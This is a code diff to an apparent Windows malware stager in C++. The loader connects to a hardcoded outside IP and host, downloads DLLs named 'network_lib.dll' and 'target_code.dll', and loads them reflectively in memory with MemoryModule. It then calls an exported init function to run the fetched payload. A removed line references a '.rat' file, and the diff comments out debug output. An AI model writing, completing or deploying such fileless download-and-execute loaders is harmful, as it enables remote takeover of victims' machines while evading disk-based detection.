@@ -1,5 +1,5 @@
 //cl /EHsc .\s3.cpp .\MemoryModule.c /link ws2_32.lib /OUT:s3.exe
-#define WIN32_LEAN_AND_MEAN
+//#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
@@ -9,25 +9,41 @@
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-std::vector <unsigned char> vNetworklib, vCutelib;
-HMEMORYMODULE hNetwork, hCute;
-
-//////////////////////////////////////////////////////////////////////////////////////////////////////////
-
 #define ADDR "103.92.235.21"
 #define H_NAME "Host: arth.imbeddex.com\r\n"
 #define PRT 80
 
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+std::vector <unsigned char> vNetworklib, vtarget_code;
+HMEMORYMODULE hNetwork, htarget;
+
 std::mutex socketMutex;
 SOCKET clientSocket = INVALID_SOCKET;
+
+typedef struct INIT_PARAMS
+{
+    void* base_address;
+
+    void* (*FindExportAddress)(HMODULE, const char*);
+    void* (*MemoryLoadLibrary)(const void *, size_t);
+    void (*MemoryFreeLibrary)(HMEMORYMODULE);
+}INIT_PARAMS;
+
+INIT_PARAMS sNetwork, sTarget;
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 typedef int (*SendDataFunc)(const std::string&, const std::string&);
 typedef std::string (*RecvDataFunc)(const std::string&);
-
 SendDataFunc send_data;
 RecvDataFunc receive_data;
+
+typedef int (*target_init)(INIT_PARAMS* params);
+target_init Target_initialization;
+
+// typedef HMEMORYMODULE (*pMemoryLoadLibrary)(const void *, size_t);
+// pMemoryLoadLibrary my_MemoryLoadLibrary;
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -39,32 +55,52 @@ std::vector<unsigned char> receive_data_raw(const std::string &filename);
 
 int load_dlls()
 {
+
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
     vNetworklib = receive_data_raw("network_lib.dll");
     hNetwork = MemoryLoadLibrary(vNetworklib.data(), vNetworklib.size());
 
     void* baseaddress_n = MemoryGetBaseAddress(hNetwork);
-    std::cout << "Base Address : 0x" << std::hex << baseaddress_n << std::endl;
+    //std::cout << "Base Address : 0x" << std::hex << baseaddress_n << std::endl;
 
-    send_data = (SendDataFunc)FindExportAddress(reinterpret_cast<HMODULE>(baseaddress_n), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
-    receive_data = (RecvDataFunc)FindExportAddress(reinterpret_cast<HMODULE>(baseaddress_n), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
-    
-    if (send_data == nullptr || receive_data == nullptr)
+    sNetwork.base_address = baseaddress_n;
+    sNetwork.FindExportAddress = FindExportAddress;
+    sNetwork.MemoryLoadLibrary = MemoryLoadLibrary;
+    sNetwork.MemoryFreeLibrary = MemoryFreeLibrary;
+
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    vtarget_code = receive_data_raw("target_code.dll");
+    htarget = MemoryLoadLibrary(vtarget_code.data(), vtarget_code.size());
+
+    void* baseaddress_t = MemoryGetBaseAddress(htarget);
+    //std::cout << "Base Address : 0x" << std::hex << baseaddress_t << std::endl;
+    sTarget.base_address = baseaddress_t;
+
+    Target_initialization = (target_init)FindExportAddress(reinterpret_cast<HMODULE>(baseaddress_t), "?target_init@@YAHPEAUINIT_PARAMS@@@Z");
+    if (!Target_initialization)
     {
-        std::cerr << "Failed to find export address of one or more functions." << std::endl;
-        return 1;
+        std::cerr << "Failed to get Target_initialization() address "<< GetLastError() << std::endl;
+        MemoryFreeLibrary(htarget);
+        return 0;
     }
-
-    return 0;
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    return 1;
 }
 
 int main()
 {
 
-    load_dlls();
+    if(!load_dlls()) return 1;
+    
+    if (!Target_initialization(&sNetwork))
+    {
+        std::cerr << "Target initialization failed!" << std::endl;
+        return 0;
+    }
 
-    std::cout << receive_data("target_data.rat") << std::endl;
     std::cout << "Done " << std::endl;
-
     return 0;
 }
 
@@ -232,6 +268,7 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
     DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
     for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
     {
+        //std::cout << ""
         char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
         if (strcmp(funcNameFromExport, funcName) == 0)
         {
@@ -239,6 +276,6 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
             return (void*)((BYTE*)hModule + funcRVA);
         }
     }
-    std::cout << "Failed to find export address of: " << funcName << std::endl;
+    std::cout << "Failed to find export address of: " << funcName << "\nGetlastError message -> " << GetLastError() << std::endl;
     return nullptr;
 }
